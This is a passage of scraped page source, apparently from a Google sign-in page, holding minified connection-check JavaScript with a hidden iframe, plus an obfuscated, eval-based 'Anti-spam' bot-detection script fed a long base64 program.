      }; var Go = Go || new Gj("check_connection"), Gp = "^([^:]+):(\\d*):(\\d?)$", Gq = null, Gr = null, Gs = null, Gt = function (a, b) { this.c = a; this.b = b; this.a = !1 }; G = Gt.prototype; G.h = function (a, b) { if (!b) return !1; if (0 <= a.indexOf(",")) return Go.error("CheckConnection result contains comma", [a]), !1; var c = b.value; b.value = c ? c + "," + a : a; return !0 }; G.d = function (a) { return this.h(a, Gr) }; G.j = function (a) { return this.h(a, Gs) }; G.i = function (a) { a = a.match(Gp); return !a || 3 > a.length ? null : a[1] };
      G.p = function (a, b) { if (!Gn(this.c, a)) return !1; if (this.a || !b) return !0; "accessible" == b ? (this.d(a), this.a = !0) : this.i(b) == this.b && (this.j(b) || this.d(a), this.a = !0); return !0 }; G.m = function () { var a; a = this.c; var b = "timestamp", c = String((new Date).getTime()); if (0 < a.indexOf("#")) throw Object("Unsupported URL Exception: " + a); return a = 0 <= a.indexOf("?") ? a + "&" + encodeURIComponent(b) + "=" + encodeURIComponent(c) : a + "?" + encodeURIComponent(b) + "=" + encodeURIComponent(c) };
      G.o = function () { var a = window.document.createElement("iframe"), b = a.style; b.visibility = "hidden"; b.width = "1px"; b.height = "1px"; b.position = "absolute"; b.top = "-100px"; a.src = this.m(); a.id = this.b; Gq.appendChild(a) };
      var Gu = function (a) { return function (b) { var c = b.origin.toLowerCase(); b = b.data; for (var d = a.length, e = 0; e < d && !a[e].p(c, b); e++); } }, Gv = function () {
          if (window.postMessage) {
              var a; a = window.__CHECK_CONNECTION_CONFIG.iframeParentElementId; var b = window.__CHECK_CONNECTION_CONFIG.connectivityElementId, c = window.__CHECK_CONNECTION_CONFIG.newResultElementId; (Gq = document.getElementById(a)) ? (b && (Gr = document.getElementById(b)), c && (Gs = document.getElementById(c)), Gr || Gs ? a = !0 : (Go.error("Unable to locate the input element to storeCheckConnection result",
["old id: " + String(b), "new id: " + String(c)]), a = !1)) : (Go.error("Unable to locate the iframe anchor to append connection test iframe", ["element id: " + a]), a = !1); if (a) {
                  a = window.__CHECK_CONNECTION_CONFIG.domainConfigs; if (!a) { if (!window.__CHECK_CONNECTION_CONFIG.iframeUri) { Go.error("Missing iframe URL in old configuration"); return } a = [{ iframeUri: window.__CHECK_CONNECTION_CONFIG.iframeUri, domainSymbol: "youtube"}] } if (0 != a.length) {
                      for (var b = a.length, c = [], d = 0; d < b; d++) c.push(new Gt(a[d].iframeUri, a[d].domainSymbol));
                      Gd(window, "message", Gu(c)); for (d = 0; d < b; d++) c[d].o()
                  }
              }
          }
      }, Gw = function () { if (window.__CHECK_CONNECTION_CONFIG) { var a = window.__CHECK_CONNECTION_CONFIG.postMsgSupportElementId; if (window.postMessage) { var b = document.getElementById(a); b ? b.value = "1" : Go.error("Unable to locate the input element to storepostMessage test result", ["element id: " + a]) } } }; G_checkConnectionMain = Go.f(Gv); G_setPostMessageSupportFlag = Go.f(Gw);
</script>
  <script>
      window.__CHECK_CONNECTION_CONFIG = {
          newResultElementId: 'checkConnection',
          domainConfigs: [{ iframeUri: 'https://accounts.youtube.com/accounts/CheckConnection?pmpo\75https%3A%2F%2Faccounts.google.com\46v\75-1664444855', domainSymbol: 'youtube'}],
          iframeUri: '',
          iframeOrigin: '',
          connectivityElementId: 'dnConn',
          iframeParentElementId: 'cc_iframe_parent',
          postMsgSupportElementId: 'pstMsg',
          msgContent: 'accessible'
      };
      G_setPostMessageSupportFlag();
      G_checkConnectionMain();
</script>

 
 
 
  
  <script type="text/javascript">      /* Anti-spam. Want to say hello? Contact (base64) Ym90Z3VhcmQtY29udGFjdEBnb29nbGUuY29tCg== */(function () { eval('var f,g=this,k=void 0,n=Date.now||function(){return+new Date},q=function(a,b,c,d,e){c=a.split("."),d=g,c[0]in d||!d.execScript||d.execScript("var "+c[0]);for(;c.length&&(e=c.shift());)c.length||b===k?d=d[e]?d[e]:d[e]={}:d[e]=b},s=function(a,b,c){if(b=typeof a,"object"==b)if(a){if(a instanceof Array)return"array";if(a instanceof Object)return b;if(c=Object.prototype.toString.call(a),"[object Window]"==c)return"object";if("[object Array]"==c||"number"==typeof a.length&&"undefined"!=typeof a.splice&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("splice"))return"array";if("[object Function]"==c||"undefined"!=typeof a.call&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("call"))return"function"}else return"null";else if("function"==b&&"undefined"==typeof a.call)return"object";return b},t=(new function(){n()},function(a,b){a.m=("E:"+b.message+":"+b.stack).slice(0,2048)}),v=function(a,b){for(b=Array(a);a--;)b[a]=255*Math.random()|0;return b},w=function(a,b){return a[b]<<24|a[b+1]<<16|a[b+2]<<8|a[b+3]},z=function(a,b){a.K.push(a.c.slice()),a.c[a.b]=k,x(a,a.b,b)},A=function(a,b,c){return c=function(){return a},b=function(){return c()},b.V=function(b){a=b},b},C=function(a,b,c,d){return function(){if(!d||a.q)return x(a,a.P,arguments),x(a,a.k,c),B(a,b)}},D=function(a,b,c,d){for(c=[],d=b-1;0<=d;d--)c[b-1-d]=a>>8*d&255;return c},B=function(a,b,c,d){return c=a.a(a.b),a.e&&c<a.e.length?(x(a,a.b,a.e.length),z(a,b)):x(a,a.b,b),d=a.s(),x(a,a.b,c),d},F=function(a,b,c,d){for(b={},b.N=a.a(E(a)),b.O=E(a),c=E(a)-1,d=E(a),b.self=a.a(d),b.C=[];c--;)d=E(a),b.C.push(a.a(d));return b},G=function(a,b){return b<=a.ca?b==a.h||b==a.d||b==a.f||b==a.o?a.n:b==a.P||b==a.H||b==a.I||b==a.k?a.v:b==a.w?a.i:4:[1,2,4,a.n,a.v,a.i][b%a.da]},H=function(a,b,c,d){try{for(d=0;84941944608!=d;)a+=(b<<4^b>>>5)+b^d+c[d&3],d+=2654435769,b+=(a<<4^a>>>5)+a^d+c[d>>>11&3];return[a>>>24,a>>16&255,a>>8&255,a&255,b>>>24,b>>16&255,b>>8&255,b&255]}catch(e){throw e;}},x=function(a,b,c){if(b==a.b||b==a.l)a.c[b]?a.c[b].V(c):a.c[b]=A(c);else if(b!=a.d&&b!=a.f&&b!=a.h||!a.c[b])a.c[b]=I(c,a.a);b==a.p&&(a.t=k,x(a,a.b,a.a(a.b)+4))},J=function(a,b,c,d,e){for(a=a.replace(/\\r\\n/g,"\\n"),b=[],d=c=0;d<a.length;d++)e=a.charCodeAt(d),128>e?b[c++]=e:(2048>e?b[c++]=e>>6|192:(b[c++]=e>>12|224,b[c++]=e>>6&63|128),b[c++]=e&63|128);return b},E=function(a,b,c){if(b=a.a(a.b),!(b in a.e))throw a.g(a.Y),a.u;return a.t==k&&(a.t=w(a.e,b-4),a.B=k),a.B!=b>>3&&(a.B=b>>3,c=[0,0,0,a.a(a.p)],a.Z=H(a.t,a.B,c)),x(a,a.b,b+1),a.e[b]^a.Z[b%8]},I=function(a,b,c,d,e,h,l,p,m){return p=K,e=K.prototype,h=e.s,l=e.Q,m=e.g,d=function(){return c()},c=function(a,r,u){for(u=0,a=d[e.D],r=a===b,a=a&&a[e.D];a&&a!=h&&a!=l&&a!=p&&a!=m&&20>u;)u++,a=a[e.D];return c[e.ga+r+!(!a+(u>>2))]},d[e.J]=e,c[e.fa]=a,a=k,d},L=function(a,b,c,d,e,h){for(e=a.a(b),b=b==a.f?function(b,c,d,h){try{c=e.length,d=c-4>>3,e.ba!=d&&(e.ba=d,d=(d<<3)-4,h=[0,0,0,a.a(a.G)],e.aa=H(w(e,d),w(e,d+4),h)),e.push(e.aa[c&7]^b)}catch(r){throw r;}}:function(a){e.push(a)},d&&b(d&255),h=0,d=c.length;h<d;h++)b(c[h])},K=function(a,b,c,d,e,h){try{if(this.j=2048,this.c=[],x(this,this.b,0),x(this,this.l,0),x(this,this.p,0),x(this,this.h,[]),x(this,this.d,[]),x(this,this.H,"object"==typeof window?window:g),x(this,this.I,this),x(this,this.r,0),x(this,this.F,0),x(this,this.G,0),x(this,this.f,v(4)),x(this,this.o,[]),x(this,this.k,{}),this.q=true,a&&"!"==a[0])this.m=a;else{if(window.atob){for(c=window.atob(a),a=[],e=d=0;e<c.length;e++){for(h=c.charCodeAt(e);255<h;)a[d++]=h&255,h>>=8;a[d++]=h}b=a}else b=null;(this.e=b)&&this.e.length?(this.K=[],this.s()):this.g(this.U)}}catch(l){t(this,l)}};f=K.prototype,f.b=0,f.p=1,f.h=2,f.l=3,f.d=4,f.w=5,f.P=6,f.L=8,f.H=9,f.I=10,f.r=11,f.F=12,f.G=13,f.f=14,f.o=15,f.k=16,f.ca=17,f.R=15,f.$=12,f.S=10,f.T=42,f.da=6,f.i=-1,f.n=-2,f.v=-3,f.U=17,f.W=21,f.A=22,f.ea=30,f.Y=31,f.X=33,f.u={},f.D="caller",f.J="toString",f.ga=34,f.fa=36,K.prototype.a=function(a,b){if(b=this.c[a],b===k)throw this.g(this.ea,0,a),this.u;return b()},K.prototype.ka=function(a,b,c,d){d=a[(b+2)%3],a[b]=a[b]-a[(b+1)%3]-d^(1==b?d<<c:d>>>c)},K.prototype.ja=function(a,b,c,d){if(3==a.length){for(c=0;3>c;c++)b[c]+=a[c];for(c=0,d=[13,8,13,12,16,5,3,10,15];9>c;c++)b[3](b,c%3,d[c])}},K.prototype.la=function(a,b){b.push(a[0]<<24|a[1]<<16|a[2]<<8|a[3]),b.push(a[4]<<24|a[5]<<16|a[6]<<8|a[7]),b.push(a[8]<<24|a[9]<<16|a[10]<<8|a[11])},K.prototype.g=function(a,b,c,d){d=this.a(this.l),a=[a,d>>8&255,d&255],c!=k&&a.push(c),0==this.a(this.h).length&&(this.c[this.h]=k,x(this,this.h,a)),b&&3<this.j&&(c="",b.message&&(c+=b.message),b.stack!=k&&(c+=": "+b.stack),c=c.slice(0,this.j-3),this.j-=c.length+3,c=J(c),L(this,this.f,D(c.length,2).concat(c),this.$))},f.M=[function(){},function(a,b,c,d,e){b=E(a),c=E(a),d=a.a(b),b=G(a,b),e=G(a,c),e==a.i||e==a.n?d=""+d:0<b&&(1==b?d&=255:2==b?d&=65535:4==b&&(d&=4294967295)),x(a,c,d)},function(a,b,c,d,e,h,l,p,m){if(b=E(a),c=G(a,b),0<c){for(d=0;c--;)d=d<<8|E(a);x(a,b,d)}else if(c!=a.v){if(d=E(a)<<8|E(a),c==a.i)if(c="",a.c[a.w]!=k)for(e=a.a(a.w);d--;)h=e[E(a)<<8|E(a)],c+=h;else{for(c=Array(d),e=0;e<d;e++)c[e]=E(a);for(d=c,c=[],h=e=0;e<d.length;)l=d[e++],128>l?c[h++]=String.fromCharCode(l):191<l&&224>l?(p=d[e++],c[h++]=String.fromCharCode((l&31)<<6|p&63)):(p=d[e++],m=d[e++],c[h++]=String.fromCharCode((l&15)<<12|(p&63)<<6|m&63));c=c.join("")}else for(c=Array(d),e=0;e<d;e++)c[e]=E(a);x(a,b,c)}},function(a){E(a)},function(a,b,c,d){b=E(a),c=E(a),d=E(a),c=a.a(c),b=a.a(b),x(a,d,b[c])},function(a,b,c){b=E(a),c=E(a),b=a.a(b),x(a,c,s(b))},function(a,b,c,d,e){b=E(a),c=E(a),d=G(a,b),e=G(a,c),c!=a.h&&(d==a.i&&e==a.i?(a.c[c]==k&&x(a,c,""),x(a,c,a.a(c)+a.a(b))):e==a.n&&(0>d?(b=a.a(b),d==a.i&&(b=J(""+b)),c!=a.d&&c!=a.f&&c!=a.o||L(a,c,D(b.length,2)),L(a,c,b)):0<d&&L(a,c,D(a.a(b),d))))},function(a,b,c){b=E(a),c=E(a),x(a,c,function(a){return eval(a)}(a.a(b)))},function(a,b,c){b=E(a),c=E(a),x(a,c,a.a(c)-a.a(b))},function(a,b){b=F(a),x(a,b.O,b.N.apply(b.self,b.C))},function(a,b,c){b=E(a),c=E(a),x(a,c,a.a(c)%a.a(b))},function(a,b,c,d,e){b=E(a),c=a.a(E(a)),d=a.a(E(a)),e=a.a(E(a)),a.a(b).addEventListener(c,C(a,d,e,true),false)},function(a,b,c,d){b=E(a),c=E(a),d=E(a),a.a(b)[a.a(c)]=a.a(d)},function(){},function(a,b,c){b=E(a),c=E(a),x(a,c,a.a(c)+a.a(b))},function(a,b,c){b=E(a),c=E(a),0!=a.a(b)&&x(a,a.b,a.a(c))},function(a,b,c,d){b=E(a),c=E(a),d=E(a),a.a(b)==a.a(c)&&x(a,d,a.a(d)+1)},function(a,b,c,d){b=E(a),c=E(a),d=E(a),a.a(b)>a.a(c)&&x(a,d,a.a(d)+1)},function(a,b,c,d){b=E(a),c=E(a),d=E(a),x(a,d,a.a(b)<<c)},function(a,b,c,d){b=E(a),c=E(a),d=E(a),x(a,d,a.a(b)|a.a(c))},function(a,b){b=a.a(E(a)),z(a,b)},function(a,b,c,d){if(b=a.K.pop()){for(c=E(a);0<c;c--)d=E(a),b[d]=a.c[d];a.c=b}else x(a,a.b,a.e.length)},function(a,b,c,d){b=E(a),c=E(a),d=E(a),x(a,d,(a.a(b)in a.a(c))+0)},function(a,b,c,d){b=E(a),c=a.a(E(a)),d=a.a(E(a)),x(a,b,C(a,c,d))},function(a,b,c){b=E(a),c=E(a),x(a,c,a.a(c)*a.a(b))},function(a,b,c,d){b=E(a),c=E(a),d=E(a),x(a,d,a.a(b)>>c)},function(a,b,c,d){b=E(a),c=E(a),d=E(a),x(a,d,a.a(b)||a.a(c))},function(a,b,c,d,e){b=F(a),c=b.C,d=b.self,e=b.N;switch(c.length){case 0:c=new d[e];break;case 1:c=new d[e](c[0]);break;case 2:c=new d[e](c[0],c[1]);break;case 3:c=new d[e](c[0],c[1],c[2]);break;case 4:c=new d[e](c[0],c[1],c[2],c[3]);break;default:a.g(a.A);return}x(a,b.O,c)},function(a,b,c,d,e,h){if(b=E(a),c=E(a),d=E(a),e=E(a),b=a.a(b),c=a.a(c),d=a.a(d),a=a.a(e),"object"==s(b)){for(h in e=[],b)e.push(h);b=e}for(e=0,h=b.length;e<h;e+=d)c(b.slice(e,e+d),a)}],K.prototype.ia=function(a){return(a=window.performance)&&a.now?function(){return a.now()|0}:function(){return+new Date}}(),K.prototype.ha=function(a,b){return b=this.Q(),a&&a(b),b},K.prototype.s=function(a,b,c,d,e,h){try{for(b=2001,c=k,d=0,a=this.e.length;--b&&(d=this.a(this.b))<a;)try{x(this,this.l,d),e=E(this)%this.M.length,(c=this.M[e])?c(this):this.g(this.W,0,e)}catch(l){l!=this.u&&((h=this.a(this.r))?(x(this,h,l),x(this,this.r,0)):this.g(this.A,l))}b||this.g(this.X)}catch(p){try{this.g(this.A,p)}catch(m){t(this,m)}}return this.a(this.k)},K.prototype.Q=function(a,b,c,d,e,h,l,p,m,y,r){if(this.m)return this.m;try{if(this.q=false,b=this.a(this.d).length,c=this.a(this.f).length,d=this.j,this.c[this.L]&&B(this,this.a(this.L)),e=this.a(this.h),0<e.length&&L(this,this.d,D(e.length,2).concat(e),this.R),h=this.a(this.F)&255,h-=this.a(this.d).length+4,l=this.a(this.f),4<l.length&&(h-=l.length+3),0<h&&L(this,this.d,D(h,2).concat(v(h)),this.S),4<l.length&&L(this,this.d,D(l.length,2).concat(l),this.T),p=[3].concat(this.a(this.d)),window.btoa?(y=window.btoa(String.fromCharCode.apply(null,p)),m=y=y.replace(/\\+/g,"-").replace(/\\//g,"_").replace(/=/g,"")):m=k,m)m="!"+m;else for(m="",e=0;e<p.length;e++)r=p[e][this.J](16),1==r.length&&(r="0"+r),m+=r;a=m,this.j=d,this.q=true,this.a(this.d).length=b,this.a(this.f).length=c}catch(u){t(this,u),a=this.m}return a};try{window.addEventListener("unload",function(){},false)}catch(M){}q("botguard.bg",K),q("botguard.bg.prototype.invoke",K.prototype.ha);') })()</script>
  <script type="text/javascript">
      document.bg = new botguard.bg('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